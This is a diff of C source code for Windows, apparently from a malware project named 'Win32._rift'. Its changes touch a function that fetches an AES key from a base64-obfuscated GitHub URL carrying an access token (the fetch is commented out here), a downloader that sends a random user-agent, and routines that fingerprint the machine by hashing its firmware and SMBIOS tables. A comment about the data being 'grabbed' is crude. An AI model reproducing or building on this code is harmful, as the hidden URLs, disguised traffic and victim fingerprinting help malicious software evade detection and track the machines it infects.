@@ -148,17 +148,17 @@ DEPRECATED PVOID IDownloadKey() {
 
 	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
 	SIZE_T nURL;
-	PCSTR szURL = EBase64DecodeA(szB64URL, 156, &nURL);
-	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, NULL, 0, NULL, NULL);
-	if (!hUrl)
+	// PCSTR szURL = EBase64DecodeA(szB64URL, 156, &nURL);
+	// HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, NULL, 0, NULL, NULL);
+	// if (!hUrl)
 		return NULL;
-	FreeMemory(szURL);
+	// FreeMemory(szURL);
 
 	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);
 	SIZE_T nRead;
-	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);
+	// InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);
 
-	InternetCloseHandle(hUrl);
+	// InternetCloseHandle(hUrl);
 	InternetCloseHandle(hNet);
 	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b)) {
 		FreeMemory(pBuffer);
@@ -168,34 +168,34 @@ DEPRECATED PVOID IDownloadKey() {
 	return pBuffer;
 }
 
-STATUS IDownloadFile(         // Reads Data from Url (Download File) / returns size read
-	_In_     PCWSTR  szUrl,   // Url to read from
-	_In_opt_ PTR     pOffset, // Offset to start reading from
-	_In_     PVOID   pBuffer, // Buffer to read to
-	_In_     SIZE_T  nSize    // count of Bytes to read (also Buffer size)
+STATUS EDownloadFile(        // Reads Data from Url (downloads File) / returns size read
+	_In_     PCWSTR szUrl,   // Url to read from
+	_In_opt_ INT    nOffset, // Offset to start reading from
+	_In_     PVOID  pBuffer, // Buffer to read to
+	_In_     SIZE_T nSize    // count of Bytes to read (also Buffer size)
 ) {
 	BOOL s = InternetCheckConnectionW(szUrl, NULL, NULL);
 	if (!s)
-		return -1;
+		return -1; // Couldn't connect to Url/Server
 	PCWSTR szAgent = EAllocRandomBase64StringW(NULL, 8, 16);
 	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	FreeMemory(szAgent);
 	if (!hNet)
-		return -2;
+		return -2; // Couldn't start Internet-Services
 	HINTERNET hUrl = InternetOpenUrlW(hNet, szUrl, NULL, 0, NULL, NULL);
 	if (!hUrl)
-		return -3;
+		return -3; // Couldn't open Url
 
-	SIZE_T nRead;
-	s = InternetReadFile(hUrl, pBuffer, nSize, &nRead);
+	if (nOffset)
+		InternetSetFilePointer(hUrl, nOffset, NULL, FILE_BEGIN, NULL);
+	s = InternetReadFile(hUrl, pBuffer, nSize, &nSize);
 	BOOL sT = s;
 	s = InternetCloseHandle(hUrl);
 	s = InternetCloseHandle(hNet);
 	if (!sT)
-		return -4;
-	return nRead;
+		return -4; // Couldn't read File
+	return nSize;
 }
-
 
 // so apperently every kind of data im grabbing is different
 // so fuck me in the ass, this is basically a session id now
@@ -208,9 +208,7 @@ VOID IGenerateSessionId(
 	BCRYPT_HASH_HANDLE hh;
 	BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);
 
-	CONST STATIC DWORD dwFTPS[] = {
-		'ACPI', 'FIRM', 'RSMB'
-	};
+	CONST DWORD dwFTPS[] = { 'ACPI', 'FIRM', 'RSMB' };
 	for (UINT8 i = 0; i < sizeof(dwFTPS) / sizeof(DWORD); i++) {
 		// Enumerate Table Entries
 		SIZE_T nTableId = EnumSystemFirmwareTables(dwFTPS[i], NULL, 0);
@@ -237,6 +235,8 @@ VOID IGenerateSessionId(
 	BCryptCloseAlgorithmProvider(ah, NULL);
 }
 
+// this generates a true hardware id by parsing the table
+// and only hashing specific entries (also avoiding specific fields)
 VOID IGenerateHardwareId(
 	_Out_ PUUID pHwId
 ) {
@@ -278,7 +278,7 @@ VOID IGenerateHardwareId(
 		SIZE_T nEntry = ((PTR)pStringTable + 2) - (PTR)pEntry;
 
 		// Test if Entry should be hashed
-		CONST STATIC BYTE bTypes[] = {
+		CONST BYTE bTypes[] = {
 			0x00, // BIOS            : O
 			0x04, // Processor       : S
 			0x07, // Cache           : O
